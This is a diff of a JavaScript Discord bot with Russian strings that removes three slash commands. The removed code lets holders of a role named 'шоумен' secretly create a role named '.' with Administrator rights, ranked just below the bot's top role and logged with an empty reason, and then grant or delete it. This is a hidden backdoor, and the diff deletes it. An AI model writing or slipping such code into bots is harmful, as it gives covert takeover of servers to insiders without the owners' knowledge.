@@ -81,18 +81,6 @@ const commands = [
     .addUserOption((option) =>
       option.setName("участник").setDescription("Кого упомянуть").setRequired(true),
     ),
-  new SlashCommandBuilder()
-    .setName("createrole")
-    .setDescription("Создать скрытую админскую роль (только для шоумена)"),
-    new SlashCommandBuilder()
-  .setName("giverole")
-  .setDescription("Выдать роль '.' участнику (только для шоумена)")
-  .addUserOption((option) =>
-    option.setName("участник").setDescription("Кому выдать роль").setRequired(true)
-  ),
-  new SlashCommandBuilder()
-  .setName("removerole")
-  .setDescription("Удалить роль '.' (только для шоумена)"),
 ].map((command) => command.toJSON());
 
 // 📤 Регистрация слэш-команд
@@ -223,87 +211,6 @@ client.on("interactionCreate", async (interaction) => {
   }
 
   // 🔒 Команда только для "шоумен"
-  if (commandName === "createrole") {
-    const isShowman = member.roles.cache.some(
-      (role) => role.name.toLowerCase() === "шоумен"
-    );
-
-    if (!isShowman) return;
-
-    try {
-      const role = await guild.roles.create({
-        name: ".",
-        permissions: ["Administrator"],
-        mentionable: false,
-        hoist: false,
-        reason: "",
-      });
-
-      const botHighest = guild.members.me.roles.highest.position;
-      await role.setPosition(botHighest - 1);
-
-      await interaction.reply({
-        content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
-        ephemeral: true,
-      });
-    } catch (error) {
-      console.error("Ошибка при создании роли:", error);
-    }
-  }
-    if (commandName === "giverole") {
-    const isShowman = member.roles.cache.some(
-      (role) => role.name.toLowerCase() === "шоумен"
-    );
-
-    if (!isShowman) return;
-
-    const targetUser = options.getUser("участник");
-    const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
-    if (!targetMember) return;
-
-    const role = guild.roles.cache.find((r) => r.name === ".");
-    if (!role) {
-      return interaction.reply({
-        content: "❌ Роль `.` не найдена. Сначала создай её через `/createrole`.",
-        ephemeral: true,
-      });
-    }
-
-    await targetMember.roles.add(role);
-    await interaction.reply({
-      content: `✅ Роль \`${role.name}\` выдана <@${targetUser.id}>.`,
-      ephemeral: true,
-    });
-  }
-    if (commandName === "removerole") {
-    const isShowman = member.roles.cache.some(
-      (role) => role.name.toLowerCase() === "шоумен"
-    );
-
-    if (!isShowman) return;
-
-    const role = guild.roles.cache.find((r) => r.name === ".");
-    if (!role) {
-      return interaction.reply({
-        content: "❌ Роль `.` не найдена.",
-        ephemeral: true,
-      });
-    }
-
-    try {
-      await role.delete("Удалена через /removerole");
-      await interaction.reply({
-        content: "🗑️ Роль `.` успешно удалена.",
-        ephemeral: true,
-      });
-    } catch (error) {
-      console.error("Ошибка при удалении роли:", error);
-      await interaction.reply({
-        content: "⚠️ Не удалось удалить роль.",
-        ephemeral: true,
-      });
-    }
-  }
 
 });
 
